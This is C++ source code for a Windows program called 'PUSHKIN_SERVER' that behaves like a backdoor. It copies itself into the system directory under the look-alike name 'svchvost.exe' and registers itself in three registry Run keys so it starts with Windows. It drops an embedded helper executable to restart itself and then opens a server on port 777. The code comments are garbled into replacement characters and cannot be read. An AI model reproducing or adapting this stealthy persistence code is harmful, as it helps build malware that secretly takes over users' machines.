#include <iostream>
#include <vector>
#include "server.h"
#include "commands.h"
#include "common.h"
#include "strlist.h"
#include "shlwapi.h"
#include "resource.h"

using namespace std;
using namespace PUSHKIN_SERVER;

#pragma warning (disable: 4996)

#pragma comment(lib, "shlwapi.lib")

// �����, ���������� ������� ��������� ���������� �������
DWORD WINAPI DeleteSU(LPVOID pParam)
{
   // ���������, ���������� �� ����
   if (!PathFileExists("su.exe")) return 0;

   // ��� ��� ���������� ������� ���� ���� (��� � ��� �������)
   while (1)
   {
      // ���������� ��� Windows 98 �� ��������� ��� ��������� �����-����� ��� ������ ���� ���������, �� ��� ������
      DeleteFile("su.exe");

      if (!PathFileExists("su.exe")) break;  // ���� ����� ��� ���, �� ������� �� �����

      Sleep(500);  // ����� �������� ��� ������� ������ �������
   }

   return 0;
}

// �������, ����������� �� ���� ��������� ����������� �������
int CreateSU(const char *path)
{
   // 1. ������� ��������� ����������� ��������� �� ����
   HRSRC hRc = FindResource(NULL, MAKEINTRESOURCE(IDR_DATA1), RT_RCDATA);
   if (!hRc) return P_ERROR;

   HGLOBAL hRes = LoadResource(NULL, hRc );
   if (!hRes) return P_ERROR;

   LPVOID pData = LockResource(hRes);
   if (!pData) return P_ERROR;

   fpos_t *pos = (fpos_t*)pData;
   unsigned int size = (unsigned int)*pos;

   FILE *pFile = fopen(path, "wb");
   if (!pFile) return P_ERROR;

   // ���������� ���� �� ����
   if (fwrite((char*)pData+sizeof(fpos_t), 1, size, pFile) != size)
      return P_ERROR;

   fflush(pFile);
   fclose(pFile);

   return P_YES;
}

// �������, �������������� ������ �� ���������� ������ (���� �� ���, ������� �� ��������������� ���)
int RegisterServer(const char *path_exe, int &b_restart_server)
{
   b_restart_server = 0;

   char buf[1024];
   char new_server_path[1024];  // ����� ������� ������� �������
   if (!GetSystemDirectory(buf, 1024)) return P_ERROR;  // ������ ��� ��������� ���������� � ��������

   // ������� ������� ��� ������ ������ (�� ������ ������ ��� ����������� ��������� �������
   strcat(buf, "\\svchvost");
   if (!PathFileExists(buf))
      if (!CreateDirectory(buf, NULL)) return P_ERROR;

   strcpy(new_server_path, buf);

   strcat(buf, "\\svchvost.exe");

   // ���� ������ ��� ������� �� �� ����� SYSTEM32, �� ���������� ��������� ����������� �������
   // ���������� ����� ����������� ����� ��
   if (strcmpi(path_exe, buf) != 0)
   {
      // ������� �������� ������� ������ ������
      // ���� �� 10 ������� �� ������� ��� �������, �� ������ ������� (������������ - 2 �������)
      int b_deleted = 0;
      for (int i=0; i<10; i++)
      {
         DeleteFile(buf);

         if (!PathFileExists(buf))
         {
            b_deleted = 1;
            break;
         }

         Sleep(200);  // ����
      }

      if (!b_deleted) return P_ERROR;  // �� ������� ������� ���� �� ������� ����� - �������� ������� ����

      // �������� ���� ���� (������ �����, ����� ������ ������� �� ������������� �����)
      if (!CopyFile(path_exe, buf, FALSE)) return P_ERROR;

      b_restart_server = 1;  // � ������ ������ ����� � �������������, ���� ������� ����������� ���� �� ����� �����
   }

   // ������������ ���������
   HKEY key;

   // ������ ���� �������
   if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // ������ ���� �������
   if (RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // ������ ���� �������
   if (RegOpenKey(HKEY_USERS, ".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", &key) == ERROR_SUCCESS)
   {
      RegSetValueEx(key, "svchvost.p", 0, REG_SZ, (LPBYTE)buf, (DWORD)strlen(buf)+1);
      RegCloseKey(key);
   }

   // ������ ��� ������������ ��� ���������� ����������� ������� - ��������� ������� ����������� �������
   if (b_restart_server)
   {
      // ��������� �� ���� ��������� ����������� ������� - � �����, ������ ����� ����������� ������
      if (CreateSU((String)new_server_path + "\\su.exe") != P_YES) return P_ERROR;

      // ��������� ��������� �� ���� �����
      STARTUPINFO si;
      PROCESS_INFORMATION pi;

      ZeroMemory( &si, sizeof(si) );
      si.cb = sizeof(si);
      ZeroMemory( &pi, sizeof(pi) );

      // ��������� ��������� ���������� �������
//      MessageBox(NULL, "Starting su.exe", "Fuck", MB_OK);
      String cmd_line = (String)new_server_path + "\\su.exe restart svchvost.exe";

      if( !CreateProcess( NULL, (LPSTR)(const char*)cmd_line, // Command line. 
                           NULL,             // Process handle not inheritable. 
                           NULL,             // Thread handle not inheritable. 
                           FALSE,            // Set handle inheritance to FALSE. 
                           0,                // No creation flags. 
                           NULL,             // Use parent's environment block. 
                           new_server_path,  // ��������� ��� �� �����, ��� ����� �������� ����� ������
                           &si,              // Pointer to STARTUPINFO structure.
                           &pi ) )            // Pointer to PROCESS_INFORMATION structure.
      {
//         MessageBox(NULL, "Error starting su.exe!", "Fuck", MB_OK);
         return P_ERROR;
      }
   }

   return P_YES;
}

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
{
#else
int main()
{
   HINSTANCE hInst = NULL;  // ��� ��� ������������ ������� � ���������� ������
#endif
   // ����� ����� ������� ������� �������� ������� ��������� ����������� �������

#ifndef _DEBUG
   DWORD thread_id;
   HANDLE hThread = CreateThread(NULL, 0, DeleteSU, NULL, 0, &thread_id);

   char buf[1024];
   GetModuleFileName(hInst, buf, 1024);

   // ����� �������� �������� ���� � ���������� (� ���� ������ ����)
   // (���� ����, �� ������ ��������������� �� ������ �����) (����� ���)
   
   int b_restart_server = 0;
   RegisterServer(buf, b_restart_server);
   if (b_restart_server) return 0;  // ������� �� ����� ���������� �������, ���� ��� ���� �������������
#endif
   CPushkinServer serv;

   // �������������� ������
   if (serv.Init(777) != P_YES)
   {
      cout << "Error starting server!" << endl;
      return 0;
   }

   // ��������� ���� ��������� ��������
   if (serv.Run() != P_YES)
   {
      cout << "Error running server!" << endl;
      return 0;
   }
   
   return 0;
}
